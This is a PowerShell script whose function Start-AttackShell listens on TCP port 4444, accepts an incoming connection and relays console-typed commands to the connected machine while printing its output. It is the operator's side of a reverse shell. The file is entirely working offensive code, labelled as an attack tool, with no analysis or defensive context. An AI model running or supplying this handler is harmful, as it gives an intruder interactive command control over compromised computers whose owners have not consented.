Function Start-AttackShell{
  $listen_port = 4444
  $buffer_size = 4096  
  $keep_listening = $true

  try{
    $listener = [System.Net.Sockets.TcpListener]$listen_port
    $listener.Start()
  }catch{
    " [-] There was an error starting the listener`n [-] Port $listen_port`n "
    return
  }

  Write-Host " [*] Listening on port $listen_port"
  $client = $listener.AcceptTcpClient()
  Write-Host " [*] Received connection"

  while($keep_listening){    
    $stream = $client.GetStream()  
    $bytes = New-Object System.Byte[] $buffer_size
    Start-Sleep -Milliseconds 250
    while($stream.DataAvailable){
      $n_recv = $stream.Read($bytes, 0, $buffer_size)
      $data = [System.Text.Encoding]::ASCII.GetString($bytes, 0, $n_recv)
      Write-Host -NoNewLine $data
    }
    $command = Read-Host
    if($command -eq "quit"){
      $keep_listening = $false
    }
    $command = [System.Text.Encoding]::ASCII.GetBytes($command)
    $stream.Write($command, 0, $command.Length)
    $stream.Flush()    
  }

  $stream.Close()
  $client.Close()
  $listener.Stop()
}

 Start-AttackShell
